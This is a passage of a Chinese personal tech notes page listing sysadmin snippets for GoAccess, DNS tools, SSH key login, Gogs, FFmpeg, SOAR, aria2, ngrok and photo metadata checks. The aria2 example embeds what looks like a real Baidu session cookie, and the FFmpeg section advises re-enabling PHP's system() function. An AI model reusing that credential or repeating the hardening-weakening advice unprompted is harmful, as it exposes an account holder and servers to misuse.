-p /etc/goaccess.conf -o /data/html/hexo/public/go-access.html --real-time-html --daemonize</span><br><span class="line"># 监听端口7890</span><br><span class="line">$ netstat -tunpl | grep <span class="string">"goaccess"</span></span><br><span class="line">tcp   <span class="number">0</span>   <span class="number">0</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">7890</span>      <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:*     LISTEN      <span class="number">21136</span>/goaccess</span><br><span class="line"># 每天执行</span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> * * goaccess -a -d -f /data/logs/fanhaobai.com.access.log -p /etc/goaccess.conf -o /data/html/hexo/public/go-access.html <span class="number">2</span>&gt; <span class="regexp">/data/</span>logs/go-access.log</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.fanhaobai.com/2017/06/go-access.html</span></span><br></pre></td></tr></table></figure>
<h3 id="DNS工具"><a href="#DNS工具" class="headerlink" title="DNS工具"></a>DNS工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">whois 命令用来查看域名的注册情况。</span><br><span class="line"></span><br><span class="line">$ whois github.com</span><br><span class="line">nslookup 命令用于互动式地查询域名记录</span><br><span class="line">[root@su html]# nslookup</span><br><span class="line">&gt; baidu.com</span><br><span class="line">Server:         <span class="number">183.60</span><span class="number">.83</span><span class="number">.19</span></span><br><span class="line">Address:        183.60.83.19#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   baidu.com</span><br><span class="line">Address: <span class="number">123.125</span><span class="number">.115</span><span class="number">.110</span></span><br><span class="line">Name:   baidu.com</span><br><span class="line">Address: <span class="number">220.181</span><span class="number">.57</span><span class="number">.216</span></span><br><span class="line"></span><br><span class="line">host 命令可以看作 dig 命令的简化版本，返回当前请求域名的各种记录。</span><br><span class="line">https:<span class="comment">//www.fanhaobai.com/2017/06/dns.html </span></span><br><span class="line">$ host github.com</span><br><span class="line"></span><br><span class="line">github.com has address <span class="number">192.30</span><span class="number">.252</span><span class="number">.121</span></span><br><span class="line">github.com mail is handled by <span class="number">5</span> ALT2.ASPMX.L.GOOGLE.COM.</span><br><span class="line">github.com mail is handled by <span class="number">10</span> ALT4.ASPMX.L.GOOGLE.COM.</span><br><span class="line">github.com mail is handled by <span class="number">10</span> ALT3.ASPMX.L.GOOGLE.COM.</span><br><span class="line">github.com mail is handled by <span class="number">5</span> ALT1.ASPMX.L.GOOGLE.COM.</span><br><span class="line">github.com mail is handled by <span class="number">1</span> ASPMX.L.GOOGLE.COM.</span><br><span class="line"></span><br><span class="line">$ host facebook.github.com</span><br><span class="line"></span><br><span class="line">facebook.github.com is an alias <span class="keyword">for</span> github.map.fastly.net.</span><br><span class="line">github.map.fastly.net has address <span class="number">103.245</span><span class="number">.222</span><span class="number">.133</span></span><br><span class="line">host 命令也可以用于逆向查询，即从 IP 地址查询域名，等同于dig -x &lt;ip&gt;。</span><br><span class="line"></span><br><span class="line">$ host <span class="number">192.30</span><span class="number">.252</span><span class="number">.153</span></span><br><span class="line"></span><br><span class="line"><span class="number">153.252</span><span class="number">.30</span><span class="number">.192</span>.in-addr.arpa domain name pointer pages.github.com.</span><br></pre></td></tr></table></figure>
<h3 id="SSH使用的安全技巧"><a href="#SSH使用的安全技巧" class="headerlink" title="SSH使用的安全技巧"></a>SSH使用的安全技巧</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> 关闭ICMP服务</span><br><span class="line"></span><br><span class="line">$ echo <span class="string">"1"</span> &gt;<span class="regexp">/proc/</span>sys/net/ipv4/icmp_echo_ignore_all</span><br><span class="line"><span class="number">2</span>） 防火墙拦截</span><br><span class="line"></span><br><span class="line">$ iptables -A INPUT -p icmp -j DROP</span><br><span class="line">检查禁 ping 是否成功：</span><br><span class="line"></span><br><span class="line">&gt; ping www.fanhaobai.com</span><br><span class="line">请求超时。</span><br><span class="line">请求超时。</span><br><span class="line">远程主机将用户的公钥保存在$HOME/.ssh/authorized_keys文件，所以这里需要将上步生成的 公钥 文件id_rsa.pub的内容 追加 到authorized_keys文件中</span><br><span class="line">配置文件为/etc/ssh/sshd_config，将下面内容关闭注释。</span><br><span class="line"></span><br><span class="line">RSAAuthentication yes</span><br><span class="line">PubkeyAuthentication yes</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys</span><br><span class="line">然后，重启 sshd 服务。</span><br><span class="line"></span><br><span class="line">$ service sshd restart</span><br><span class="line"><span class="number">3</span>） 免密登录测试</span><br><span class="line"></span><br><span class="line">这里通过配置 识别名 ，连接时只需指定连接识别名即可，简单方便。</span><br><span class="line"></span><br><span class="line">在$HOME/.ssh目录下创建config文件，并作如下配置：</span><br><span class="line"></span><br><span class="line">Host fhb</span><br><span class="line">HostName www.fanhaobai.com</span><br><span class="line">Port <span class="number">10086</span></span><br><span class="line">User fhb</span><br><span class="line">使用识别名连接 SSH 登录远程主机，出现如下内容表示公钥登录成功。</span><br><span class="line"></span><br><span class="line">$ ssh fhb</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Welcome to aliyun Elastic Compute Service!</span><br><span class="line"></span><br><span class="line">用过各种开发环境 homestead ， wsl ，还有 windows 版本的 valet ,以及其他集成环境比如 phpstudy ,laragon。 最好用的还是 wsl 和 windows 版本的 valet。 homestead 太笨重了，配置麻烦，启动还慢。</span><br></pre></td></tr></table></figure>
<h3 id="Windows安装Gogs"><a href="#Windows安装Gogs" class="headerlink" title="Windows安装Gogs"></a>Windows安装Gogs</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">下载二进制 https:<span class="comment">//gogs.io/docs/installation/install_from_binary</span></span><br><span class="line">下载nssm 注册Windows服务 加入环境变量https:<span class="comment">//nssm.cc/download</span></span><br><span class="line">https:<span class="comment">//zmcdbp.com/install-gogs-in-windows/ </span></span><br><span class="line">Gogs目录下的script/windows文件夹，可以看到里面有个install-<span class="keyword">as</span>-service.bat的脚本，</span><br><span class="line">如果你解压的目录不是C:<span class="regexp">/gogs，右键编辑这个脚本，把SET gogspath=C:\gogs改成你解压Gogs的目录。</span></span><br><span class="line"><span class="regexp">@ECHO off</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">:: This script relies on nssm.exe to work.</span></span><br><span class="line"><span class="regexp">:: Please, download it and make it available on the system path,</span></span><br><span class="line"><span class="regexp">:: or copy it to the gogs path.</span></span><br><span class="line"><span class="regexp">:: https:/</span><span class="regexp">/nssm.cc/</span>download</span><br><span class="line">:: This script itself should run <span class="keyword">in</span> the gogs path, too.</span><br><span class="line">:: In <span class="keyword">case</span> <span class="keyword">of</span> startup failure, please read carefully the log file.</span><br><span class="line">:: Make sure Gogs work running manually <span class="keyword">with</span> <span class="string">"gogs web"</span> before running</span><br><span class="line">:: <span class="keyword">this</span> script.</span><br><span class="line">:: And, please, read carefully the installation docs first:</span><br><span class="line">:: https:<span class="comment">//gogs.io/docs/installation</span></span><br><span class="line">:: To unistall the service, run <span class="string">"nssm remove gogs"</span> and restart Windows.</span><br><span class="line"></span><br><span class="line">:: <span class="built_in">Set</span> the folder where you extracted Gogs. Omit the last slash.</span><br><span class="line">SET gogspath=d:\gogs</span><br><span class="line"></span><br><span class="line">nssm install gogs <span class="string">"%gogspath%\gogs.exe"</span></span><br><span class="line">nssm set gogs AppParameters <span class="string">"web"</span></span><br><span class="line">nssm set gogs Description <span class="string">"A painless self-hosted Git service."</span></span><br><span class="line">nssm set gogs DisplayName <span class="string">"Gogs"</span></span><br><span class="line">nssm set gogs Start SERVICE_DELAYED_AUTO_START</span><br><span class="line">nssm set gogs AppStdout <span class="string">"%gogspath%\gogs.log"</span></span><br><span class="line">nssm start gogs</span><br><span class="line">pause</span><br><span class="line">然后我们就可以右键点击选择以管理员身份运行，等命令行窗口运行完毕：</span><br><span class="line">打开浏览器，输入http:<span class="comment">//127.0.0.1:3000，出现如下界面说明Gogs已经正常运行啦</span></span><br></pre></td></tr></table></figure>
<h3 id="FFmpeg-视频操作"><a href="#FFmpeg-视频操作" class="headerlink" title="FFmpeg 视频操作"></a>FFmpeg 视频操作</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">docker pull jrottenberg/ffmpeg</span><br><span class="line">docker run -v /Users/js/Desktop/sp:<span class="regexp">/root/</span>download jrottenberg/ffmpeg:latest -i /root/download/mp.mp4 -vcodec copy -an /root/download/out.mp4</span><br><span class="line"></span><br><span class="line">docker run -v Docker运行镜像命令(不用更改)</span><br><span class="line">/Users/js/Desktop/sp 系统目录(自定义)</span><br><span class="line">/root/download 镜像内部项目(不用更改)</span><br><span class="line">jrottenberg/ffmpeg:latest Docker镜像名称(不用更改)</span><br><span class="line">-i ffmpeg命令</span><br><span class="line">/root/download/mp.mp4 其中mp.mp4是未消音的视频文件</span><br><span class="line">-vcodec copy -an ffmpeg命令</span><br><span class="line">/root/download/out.mp4 out.mp4是消音后的视频文件</span><br><span class="line">命令执行成功后会在/Users/js/Desktop/sp目录下出现out.mp4视频文件</span><br><span class="line">system(<span class="string">'docker run -v /Users/js/Desktop/sp:/root/download jrottenberg/ffmpeg:latest -i /root/download/mp.mp4 -vcodec copy -an /root/download/out.mp4 2&gt;&amp;1'</span>);</span><br><span class="line">注意事项：https:<span class="comment">//laravelacademy.org/post/19479.html </span></span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>注意需要在命令后面最加<span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"><span class="number">2.</span>php默认是无法执行system等命令的,需要更改php.ini中的disable_functions，删除其中的system。重启PHP</span><br></pre></td></tr></table></figure>
<h3 id="一个对SQL进行优化和改写的自动化工具"><a href="#一个对SQL进行优化和改写的自动化工具" class="headerlink" title="一个对SQL进行优化和改写的自动化工具"></a>一个对SQL进行优化和改写的自动化工具</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="comment">//github.com/XiaoMi/soar/releases/download/0.9.0/soar.linux-amd64 -O soar</span></span><br><span class="line">chmod a+x soar</span><br><span class="line">[root@su ~]# echo 'select * from film' | ./soar</span><br><span class="line"># Query: 687D590364E29465</span><br><span class="line"></span><br><span class="line">★ ★ ★ ☆ ☆ <span class="number">75</span>分</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">  *</span><br><span class="line">FROM</span><br><span class="line">  film</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   最外层SELECT未指定WHERE条件</span><br><span class="line"></span><br><span class="line">* **Item:**  CLA<span class="number">.001</span></span><br><span class="line"></span><br><span class="line">* **Severity:**  L4</span><br><span class="line"></span><br><span class="line">* **Content:**  SELECT语句没有WHERE子句，可能检查比预期更多的行(全表扫描)。对于SELECT COUNT(\*)类型的请求如果不要</span><br><span class="line">求精度，建议使用SHOW TABLE STATUS或EXPLAIN替代。</span><br><span class="line"></span><br><span class="line">   不建议使用SELECT * 类型查询</span><br><span class="line"></span><br><span class="line">* **Item:**  COL<span class="number">.001</span></span><br><span class="line"></span><br><span class="line">* **Severity:**  L1</span><br><span class="line"></span><br><span class="line">* **Content:**  当表结构变更时，使用\*通配符选择所有列将导致查询的含义和行为会发生更改，可能导致查询返回更多的数</span><br><span class="line">据。</span><br><span class="line">SQL美化</span><br><span class="line"></span><br><span class="line">echo <span class="string">"select * from tbl where col = 'val'"</span> | ./soar -report-type=pretty</span><br><span class="line">输出</span><br><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">  *</span><br><span class="line">FROM</span><br><span class="line">  tbl</span><br><span class="line">WHERE</span><br><span class="line">  col  = <span class="string">'val'</span>;</span><br></pre></td></tr></table></figure>
<h3 id="Aria2-加速百度网盘下载"><a href="#Aria2-加速百度网盘下载" class="headerlink" title="Aria2 加速百度网盘下载"></a>Aria2 加速百度网盘下载</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">生成下载 url 的过程需要借助 https:<span class="comment">//chrome.google.com/webstore/detail/baiduexporter/jgebcefbdjhkhapijgbhkidaegoocbjj?hl=zh-CN</span></span><br><span class="line">aria2c.exe -c -s32 -k32M -x16 -t1 -m0 --enable-rpc=<span class="literal">true</span> 下载 url 取值 </span><br><span class="line">-t1 表示的是每隔 <span class="number">1</span> 秒重试一次 </span><br><span class="line">-m0 表示的是重试设置 </span><br><span class="line"> 此外，下载 url 中会包含 --header 的信息：User-Agent、Referer、Cookie、url</span><br><span class="line"> 理论上 User-Agent、Referer 应该时固定的，Cookie、url 每次会生成不一样的 </span><br><span class="line">User-Agent: netdisk;<span class="number">5.3</span><span class="number">.4</span><span class="number">.5</span>;PC;PC-Windows;<span class="number">5.1</span><span class="number">.2600</span>;WindowsBaiduYunGuanJia</span><br><span class="line">Referer: http:<span class="comment">//pan.baidu.com/disk/home</span></span><br><span class="line"></span><br><span class="line">aria2c -c -s256 -k2M -x256 -t1 -m0 --enable-rpc=<span class="literal">true</span> -o <span class="string">"pyspark-part1.zip"</span> --header <span class="string">"User-Agent: netdisk;5.3.4.5;PC;PC-Windows;5.1.2600;WindowsBaiduYunGuanJia"</span> --header <span class="string">"Referer: http://pan.baidu.com/disk/home"</span> --header <span class="string">"Cookie: BDUSS=FFzb2s3Z2NRcnlTRE00WkxLYn5jTzhLdXktflVYbWprdXRpZm5EQ1FnYXlyTzFaSVFBQUFBJCQAAAAAAAAAAAEAAADYoS0veWVhckxQRjEzMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALIfxlmyH8ZZb; pcsett=1506245668-3f7c157ceb2130e195638efdf62944aa"</span> <span class="string">"https://pcs.baidu.com/rest/2.0/pcs/file?method=download&amp;app_id=250528&amp;path=%2FQQ% E7% BE% A4% E5%90%88% E4% B9% B0% E5% A4% A7% E6%95% B0% E6%8D% AE% E8% A7%86% E9% A2%91%2Fxtwy% E4% B9%8Bpyspark% E8% A7%86% E9% A2%91%2F% E5% AD% A6% E5% BE%92% E6%97% A0% E5% BF% A7pyspark% E8% AF% BE% E7% A8%8Bpart1.zip"</span></span><br><span class="line"></span><br><span class="line">aria2c.exe --conf-path=aria2.conf</span><br></pre></td></tr></table></figure>
<h3 id="ffmpeg给视频添加水印"><a href="#ffmpeg给视频添加水印" class="headerlink" title="ffmpeg给视频添加水印"></a>ffmpeg给视频添加水印</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">rpm --<span class="keyword">import</span> http:<span class="comment">//packages.atrpms.net/RPM-GPG-KEY.atrpms</span></span><br><span class="line">yum -y --enablerepo = atrpms install ffmpeg ffmpeg-devel</span><br><span class="line">main_h - 视频的高度</span><br><span class="line">main_w - 视频的宽度</span><br><span class="line">overlay_h - 重叠广告的高度</span><br><span class="line">overlay_w - 重叠式广告的宽度</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">ffmpeg -i birds.mp4 -i watermark.png</span><br><span class="line">-filter_complex <span class="string">"overlay=x=(main_w-overlay_w)/2:y=(main_h-overlay_h)/2"</span> birds2.mp4</span><br><span class="line">如果我们想要为剪辑添加品牌或水印，但不覆盖现有视频，我们可以使用 pad 过滤器为剪辑添加一些填充，然后将我们的水印放在填充上，如下所示：</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">ffmpeg -i birds.mp4 -i watermark2.png</span><br><span class="line">-filter_complex <span class="string">"pad=height=ih+40:color=#71cbf4,overlay=(main_w-overlay_w)/2:main_h-overlay_h"</span></span><br><span class="line">birds3.mp4</span><br><span class="line">一旦你开始得到这个的概念之后，你甚至可以让你的水印动起来</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">ffmpeg -i birds.mp4 -i watermark.png</span><br><span class="line">-filter_complex <span class="string">"overlay='if(gte(t,1), -w+(t-1)*200, NAN)':(main_h-overlay_h)/2"</span> birds4.mp4</span><br><span class="line">如果遇到这个 error</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">The encoder <span class="string">'aac'</span> is experimental but experimental codecs are not enabled, add <span class="string">'-strict -2'</span> <span class="keyword">if</span> you want to use it.</span><br><span class="line">那就添加个参数吧</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">ffmpeg -i yii.mp4 -i logo.jpg -strict <span class="number">-2</span> -filter_complex <span class="string">"overlay=x=(main_w-overlay_w)/2:y=(main_h-overlay_h)/2"</span> birds2.mp4</span><br><span class="line">如果遇到其他错误，就去查查资料吧 https:<span class="comment">//www.njphper.com/posts/2ffce39e.html</span></span><br></pre></td></tr></table></figure>
<h3 id="内网穿透ngrok"><a href="#内网穿透ngrok" class="headerlink" title="内网穿透ngrok"></a>内网穿透ngrok</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> 下载工具 wget https:<span class="comment">//bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip（默认下载到当前路径）</span></span><br><span class="line"><span class="number">2</span> 解压 unzip ngrok-stable-linux-amd64.zip</span><br><span class="line"><span class="number">3</span> 直接用 ./ngrok http <span class="number">8789</span></span><br><span class="line"></span><br><span class="line">Session Status                connecting</span><br><span class="line">Session Status                online</span><br><span class="line">Sesion  Expires               <span class="number">7</span> hours, <span class="number">50</span> minutes</span><br><span class="line">Versionerface                 <span class="number">2.3</span><span class="number">.28</span>            <span class="number">040</span></span><br><span class="line">R gio                         United States (us)</span><br><span class="line">Web Interface                 http:<span class="comment">//127.0.0.1:4040   rt5     p50     p90</span></span><br><span class="line">F rward ng                    http:<span class="comment">//b431dd61.ngrok.io -&gt; http://localhost:8789</span></span><br><span class="line">Forwarding                    https:<span class="comment">//b431dd61.ngrok.io -&gt; http://localhost:8789</span></span><br><span class="line"></span><br><span class="line">php开启一个端口</span><br><span class="line">cd /usr/html</span><br><span class="line">php -S localhost:<span class="number">8789</span></span><br><span class="line"></span><br><span class="line">浏览器访问http:<span class="comment">//b431dd61.ngrok.io</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//dashboard.ngrok.com/get-started 登录GitHub后获取token  ./ngrok http 80</span></span><br><span class="line"></span><br><span class="line">ngrok by @inconshreveable                                                              (Ctrl+C to quit)</span><br><span class="line"></span><br><span class="line">Session Status                online</span><br><span class="line">Update                        update available (version <span class="number">2.3</span><span class="number">.28</span>, Ctrl-U to update)</span><br><span class="line">Version                       <span class="number">2.2</span><span class="number">.8</span></span><br><span class="line">Region                        United States (us)</span><br><span class="line">Web Interface                 http:<span class="comment">//127.0.0.1:4040</span></span><br><span class="line">Forwarding                    http:<span class="comment">//8a00ef79.ngrok.io -&gt; localhost:80</span></span><br><span class="line">Forwarding                    https:<span class="comment">//8a00ef79.ngrok.io -&gt; localhost:80</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.cnblogs.com/along21/p/8384304.html</span></span><br></pre></td></tr></table></figure>
<h3 id="图片是否ps过"><a href="#图片是否ps过" class="headerlink" title="图片是否ps过"></a>图片是否ps过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.chongbuluo.com/thread-744-1-1.html</span></span><br><span class="line">fotoforensics.com 通过这个网站的图像分析，也可以。</span><br><span class="line"></span><br><span class="line">先来啰嗦几句：FotoForensics 是依靠 ELA，Metadata，Find original photo 等方式来判断图片是否经历过数字处理。其中 ELA（<span class="built_in">Error</span> Level</span><br><span class="line">Analysis）是其主要特色功能，通过分析图片 JPEG 压缩率来判断。</span><br><span class="line">原图的所有 Metadata 信息</span><br><span class="line">File</span><br><span class="line">File Type        JPEG</span><br><span class="line">File Type Extension        jpg</span><br><span class="line">MIME Type        image/jpeg</span><br><span class="line">Image Width        <span class="number">730</span></span><br><span class="line">Image Height        <span class="number">1184</span></span><br><span class="line">Encoding Process        Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample        <span class="number">8</span></span><br><span class="line">Color Components        <span class="number">3</span></span><br><span class="line">Y Cb Cr Sub Sampling        YCbCr4:<span class="number">2</span>:<span class="number">0</span> (<span class="number">2</span> <span class="number">2</span>)</span><br><span class="line">JFIF</span><br><span class="line">JFIF Version        <span class="number">1.01</span></span><br><span class="line">Resolution Unit        None</span><br><span class="line">X Resolution        <span class="number">1</span></span><br><span class="line">Y Resolution        <span class="number">1</span></span><br><span class="line">Composite</span><br><span class="line">Image Size        <span class="number">730</span>x1184</span><br><span class="line">Megapixels        <span class="number">0.864</span></span><br><span class="line"></span><br><span class="line">右图的部分 Metadata 信息</span><br><span class="line">File</span><br><span class="line">File Type        JPEG</span><br><span class="line">File Type Extension        jpg</span><br><span class="line">MIME Type        image/jpeg</span><br><span class="line">Exif Byte Order        Big-endian (Motorola, MM)</span><br><span class="line">Current IPTC Digest        e8f15cf32fc118a1a27b67adc564d5ba</span><br><span class="line">Image Width        <span class="number">730</span></span><br><span class="line">Image Height        <span class="number">1184</span></span><br><span class="line">Encoding Process        Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample        <span class="number">8</span></span><br><span class="line">Color Components        <span class="number">3</span></span><br><span class="line">Y Cb Cr Sub Sampling        YCbCr4:<span class="number">4</span>:<span class="number">4</span> (<span class="number">1</span> <span class="number">1</span>)</span><br><span class="line">JFIF</span><br><span class="line">JFIF Version        <span class="number">1.02</span></span><br><span class="line">EXIF</span><br><span class="line">Orientation        Horizontal (normal)</span><br><span class="line">X Resolution        <span class="number">72</span></span><br><span class="line">Y Resolution        <span class="number">72</span></span><br><span class="line">Resolution Unit        inches</span><br><span class="line">Software        Adobe Photoshop CS3 Windows</span><br><span class="line">Modify <span class="built_in">Date</span>        <span class="number">2008</span>:<span class="number">05</span>:<span class="number">19</span> <span class="number">20</span>:<span class="number">47</span>:<span class="number">21</span></span><br><span class="line">注意最后两行，分别是修图工具（Photoshop CS3）和修改时间信息，看来时间挺久的了</span><br></pre></td></tr></table></figure>
<h3 id="postman模拟请求"><a href="#postman模拟请求" class="headerlink" title="postman模拟请求"></a>postman模拟请求</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">右键请求 -&gt; copy -&gt; copy <span class="keyword">as</span> curl。</span><br><span class="line"></span><br><span class="line">现在我们的粘贴板里面有个 curl 格式的请求，接下来我们打开 postman，点击左上角 Import，然后点 Paste Raw Text，然后点击 Import 完成导入。</span><br><span class="line">这时候我们就把请求的完整信息复制到了 postman：</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33410</span></span><br></pre></td></tr></table></figure>
